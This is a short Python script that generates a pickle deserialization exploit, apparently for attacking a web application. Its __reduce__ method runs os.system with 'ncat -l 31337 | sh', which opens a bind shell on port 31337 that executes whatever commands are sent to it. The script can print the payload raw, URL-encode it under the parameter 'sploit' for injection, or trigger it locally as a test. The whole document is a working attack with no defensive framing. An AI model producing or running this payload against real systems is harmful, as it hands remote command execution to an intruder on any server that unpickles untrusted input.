#!/usr/bin/env python3

from os import system
from urllib3.request import urlencode
import pickle

COMMAND_STR = "ncat -l 31337 | sh"

class Foo:
    def __reduce__(self):
        return (system, (COMMAND_STR,))

if __name__ == '__main__':
    from sys import argv

    instance = Foo()
    bs = pickle.dumps(instance)

    if "test" in argv:
        pickle.loads(bs)
    elif "url" in argv:
        print(urlencode({'sploit':bs})) 
    else:
        print(bs)
